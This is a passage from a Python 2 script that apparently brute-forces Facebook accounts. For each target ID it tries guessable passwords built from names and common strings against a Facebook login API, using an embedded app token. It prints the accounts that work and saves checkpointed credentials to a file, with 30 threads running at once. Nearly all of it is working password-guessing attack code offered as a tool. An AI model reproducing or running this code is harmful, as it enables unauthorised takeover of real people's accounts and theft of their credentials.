				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '123'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				            print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				            print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user								
				            print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass2 + '\n'											
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				               print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				               print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				               print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass2 + '\n'
				               cek = open("out/super_cp.txt", "a")
				               cek.write("ID:" +user+ " Pw:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['last_name']+'123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'								
						       print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']									
						       print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user							
						       print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass3 + '\n'
				                           cek = open("out/super_cp.txt", "a")
				                           cek.write("ID:" +user+ " Pw:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + 'khan'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user											
				                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass4 + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass4 + '\n'
				                                       cek = open("out/super_cp.txt", "a")
				                                       cek.write("ID:" +user+ " Pw:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '786786'							
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'						
						                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']							
						                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user					
						                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass5 + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass5 + '\n'
				                                                   cek = open("out/super_cp.txt", "a")
				                                                   cek.write("ID:" +user+ " Pw:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = 'Pakistan'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				                                                           print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                           print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user									
				                                                           print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass6 + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                               print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                               print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                               print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass6 + '\n'
				                                                               cek = open("out/super_cp.txt", "a")
				                                                               cek.write("ID:" +user+ " Pw:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name']+'12345'						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'					
									                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']					
									                               print '\x1b[1;91m[•⊱✿⊰•] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user				
									                               print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass7 + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                           print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass7 + '\n'
				                                                                           cek = open("out/super_cp.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['last_name'] + '786'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;91m[  *  ] \x1b[1;92m[OK]'											
				                                                                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']											
				                                                                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user										
				                                                                                   print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass8 + '\n'											
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                       print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass8 + '\n'
				                                                                                       cek = open("out/super_cp.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '786'					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;91m[ * ] \x1b[1;92m[OK]'			
											                                       print '\x1b[1;91m[☆✤☆] \x1b[1;91mName \x1b[1;91m    : \x1b[1;91m' + b['name']			
											                                       print '\x1b[1;91m[☆✤☆] \x1b[1;91mID \x1b[1;91m      : \x1b[1;91m' + user	
											                                       print '\x1b[1;91m[☆✤☆] \x1b[1;91mPassword \x1b[1;91m: \x1b[1;91m' + pass9 + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;93m[ * ] \x1b[1;96m[Checkpoint]'
				                                                                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
				                                                                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
				                                                                                                   print '\x1b[1;93m[☆✤☆] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
#Dev:Babar_Ali
        print ""
	print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
	print "\033[1;96m║                \033[1;92m🎉 PROCESS COMPLETED! 🎉\033[1;96m                ║"
	print "\033[1;96m╠════════════════════════════════════════════════════════════╣"
	print "\033[1;96m║  \033[1;97m📊 Total Results: \033[1;92m" + str(len(oks)) + " \033[1;97mOK \033[1;96m/ \033[1;91m" + str(len(cekpoint)) + " \033[1;97mCP\033[1;96m"
	print "\033[1;96m║  \033[1;97m✅ Successful: \033[1;92m" + str(len(oks)) + " \033[1;97maccounts\033[1;96m"
	print "\033[1;96m║  \033[1;97m🔐 Checkpoint: \033[1;91m" + str(len(cekpoint)) + " \033[1;97maccounts\033[1;96m"
	print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
	print ""
	print "\033[1;96m╔════════════════════════════════════════════════════════════╗"
	print "\033[1;96m║                                                              ║"
	print "\033[1;96m║    \033[1;92m██████╗  ██████╗ ███╗   ██╗███████╗    ██╗\033[1;96m                ║"
	print "\033[1;96m║    \033[1;92m██╔══██╗██╔═══██╗████╗  ██║██╔════╝    ██║\033[1;96m                ║"
	print "\033[1;96m║    \033[1;92m██║  ██║██║   ██║██╔██╗ ██║█████╗      ██║\033[1;96m                ║"
	print "\033[1;96m║    \033[1;92m██║  ██║██║   ██║██║╚██╗██║██╔══╝      ╚═╝\033[1;96m                ║"
	print "\033[1;96m║    \033[1;92m██████╔╝╚██████╔╝██║ ╚████║███████╗    ██╗\033[1;96m                ║"
	print "\033[1;96m║    \033[1;92m╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚═╝\033[1;96m                ║"
	print "\033[1;96m║                                                              ║"
	print "\033[1;96m╚════════════════════════════════════════════════════════════╝"
	print ""
	raw_input("\033[1;96m[\033[1;93m🔙\033[1;96m] \033[1;97mPress Enter to go back to menu\033[1;96m: ")
	menu()

if __name__ == '__main__':
	login()
